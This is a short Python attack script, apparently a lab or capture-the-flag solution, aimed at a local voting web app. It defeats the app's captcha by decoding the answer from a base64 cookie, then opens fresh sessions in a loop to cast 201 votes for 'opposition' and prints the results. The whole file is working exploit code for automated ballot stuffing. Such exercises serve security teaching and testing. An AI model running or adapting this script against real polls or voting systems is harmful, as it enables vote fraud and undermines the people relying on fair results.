#!/usr/bin/env python3

from requests import session
from base64 import b64decode

BASE_URI = "http://172.22.0.2:5000"
CAPTCHA_ENDPOINT = BASE_URI+"/captcha"
VOTE_ENDPOINT    = BASE_URI+"/vote"
RESULTS_ENDPOINT = BASE_URI+"/results"

for i in range(201):
    # Open a new session
    s = session()

    # Get a captcha
    captcha_response = s.get(CAPTCHA_ENDPOINT)
    
    # Read cookies and decode base64 of the answer
    captcha_answer = b64decode(captcha_response.cookies['captcha_answer']).decode()

    # Solve captcha with post request
    captcha_solution = s.post(CAPTCHA_ENDPOINT, data={'answer': captcha_answer})

    # Vote for opposition
    vote_response = s.post(VOTE_ENDPOINT, data={'candidate': 'opposition'})

    print(f"Vote {i+1}: {vote_response.status_code}")

# Check final results
final_results = s.get(RESULTS_ENDPOINT)
print(final_results.text)